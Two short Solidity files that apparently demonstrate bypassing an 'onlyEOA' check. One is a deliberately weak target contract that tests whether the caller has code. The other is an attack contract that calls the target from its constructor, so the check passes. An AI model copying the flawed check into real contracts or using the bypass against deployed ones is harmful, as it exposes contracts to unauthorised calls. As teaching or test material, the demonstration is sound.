// SPDX-License-Identifier: MIT
pragma solidity 0.8.15;

contract BaseTargetContract {

        /**
     * @dev Returns true if `account` is a contract.
     *
     * [IMPORTANT]
     * ====
     * It is unsafe to assume that an address for which this function returns
     * false is an externally-owned account (EOA) and not a contract.
     *
     * Among others, `isContract` will return false for the following
     * types of addresses:
     *
     *  - an externally-owned account
     *  - a contract in construction
     *  - an address where a contract will be created
     *  - an address where a contract lived, but was destroyed
     * ====
     */
    
    bool public attackSuccess = false;

    function isContract(address account) internal view returns (bool){
        return account.code.length > 0;
    }

    modifier onlyEOA() {
        require(!isContract(msg.sender), "StandardBridge: function can only be called from an EOA");
        _;
    }

    function attack() public onlyEOA{
          attackSuccess = true;
    }
}

// SPDX-License-Identifier: MIT
pragma solidity 0.8.15;

contract AttackContract {

    BaseTargetContract target = BaseTargetContract(0x5FD6eB55D12E759a21C09eF703fe0CBa1DC9d88D);

    constructor(){
        target.attack();
    }
}